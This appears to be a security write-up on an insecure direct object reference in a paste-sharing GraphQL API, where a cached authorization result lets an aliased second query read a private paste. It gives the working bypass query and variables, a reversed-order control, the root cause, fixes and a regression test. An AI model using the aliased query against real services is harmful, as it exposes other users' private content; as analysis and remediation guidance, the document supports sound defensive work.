# PasteShare GraphQL Alias IDOR

## What Is Happening

The application exposes a paste-sharing GraphQL API. Direct access to a private paste by ID is blocked, but a single GraphQL operation can request multiple aliased `paste(id)` fields.

When a readable public paste is requested first, a later aliased request for a private paste in the same operation is authorized incorrectly.

## Why It Happens

The authorization decision for `Query.paste` appears to be reused too broadly within a single GraphQL request.

Likely root cause:

```text
GraphQL Shield object-level rule
-> first paste(id) authorization succeeds for a public paste
-> rule result is cached without including args.id
-> second paste(id) with a private object ID inherits the allowed decision
```

This is an IDOR because the attacker controls the object identifier and the server fails to enforce object-level authorization for the second object.

## Exact Test

Direct private paste access is blocked:

```graphql
query($id: ID!) {
  paste(id: $id) {
    id
    title
    content
    visibility
  }
}
```

Expected signal:

```text
Not authorized
```

The bypass uses aliases and field order:

```graphql
query($publicId: ID!, $privateId: ID!) {
  allowed: paste(id: $publicId) {
    id
    title
    visibility
    owner { username }
  }
  target: paste(id: $privateId) {
    id
    title
    content
    visibility
    owner { id username }
    createdAt
  }
}
```

Variables:

```json
{
  "publicId": "<known-public-paste-id>",
  "privateId": "<known-private-paste-id>"
}
```

## Expected Signal

The response includes:

```text
allowed.visibility = PUBLIC
target.visibility = PRIVATE
target.content = [redacted private content]
```

## Negative Control

Reverse the order:

```graphql
query($publicId: ID!, $privateId: ID!) {
  target: paste(id: $privateId) {
    id
    title
    content
  }
  allowed: paste(id: $publicId) {
    id
    title
    visibility
  }
}
```

Expected signal:

```text
target: Not authorized
allowed: Not authorized
```

The order dependency is the key evidence for authorization result reuse.

## Result Interpretation

Confirmed chain:

```text
public paste ID
-> successful object authorization
-> same operation requests private paste ID through an alias
-> private object is returned
```

This is not just an introspection issue. Introspection helps map the API, but the confirmed bug is broken object-level authorization.

## Root Cause

The object-level authorization rule is likely cached per request, field, or context, rather than per object ID and user identity.

Rules that depend on `args.id`, ownership, visibility, tenant, role, or resource state must not use a cache key that ignores those values.

## Impact

An attacker can read private paste content if they know or can discover a private paste ID and can place any readable public paste first in the same GraphQL operation.

If IDs are predictable, logged, shared, leaked through referrals, or exposed through another endpoint, this becomes a practical private-data disclosure.

## Fix

- Disable caching for object-level authorization rules that depend on request arguments.
- If caching is required, include user identity, operation, field name, object ID, and relevant authorization state in the cache key.
- Enforce authorization in the resolver or data-access layer as a second line of defense.
- Add regression tests for same-operation aliasing and reversed field order.
- Disable production stack traces in GraphQL errors.

## Regression Test

Use a normal or unauthenticated requester:

```text
allowed: paste(id: <public-id>)
target: paste(id: <private-id-owned-by-another-user>)
```

Expected secure behavior:

```text
allowed returns the public paste
target returns Not authorized
```

